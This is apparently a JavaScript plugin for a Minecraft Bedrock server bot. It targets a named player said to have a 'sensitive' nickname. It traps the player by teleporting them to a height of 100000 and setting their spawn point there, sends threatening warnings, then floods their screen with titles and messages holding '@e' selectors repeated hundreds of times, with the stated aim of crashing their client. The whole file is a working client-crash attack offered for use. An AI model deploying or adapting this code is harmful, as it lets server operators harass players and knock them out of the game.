module.exports = function(fuck) {
    // 传送，模式更改，重生点设置
    game.oneShotCommand(`tp "${fuck}" 0 100000 0`);
    game.oneShotCommand(`spawnpoint "${fuck}" 0 100000 0`);
    game.oneShotCommand(`gamemode a "${fuck}"`);
    
    // 多种警告信息
    game.oneShotCommand(`title "${fuck}" title §c你的呢称携带敏感词，请立即退出游戏`);
    game.oneShotCommand(`title "${fuck}" subtitle §aFastCmd Sensitive Attacker`);
    game.oneShotCommand(`title "${fuck}" actionbar §e即将对你的客户端进行崩溃操作！`);
    game.oneShotCommand(`execute "${fuck}" ~~~ tell @s §c你的呢称携带敏感词，请立即退出游戏`);
    
    // 准备好爆杀了吗？
    var text = '@e ';
    var at_e = text.repeat(100);
    
    // 奶奶滴，直接来吧！
    setTimeout(function(){
        for(var i = 0;i<20;i++) {
            game.oneShotCommand(`title "${fuck}" title §l§o§e${at_e}`);
            game.oneShotCommand(`title "${fuck}" subtitle §l§o§e${at_e}`);
            game.oneShotCommand(`title "${fuck}" actionbar §l§o§e${at_e}`);
            game.oneShotCommand(`execute "${fuck}" ~~~ tell @s §l§o§e${at_e}`);
        };
    },3000);
}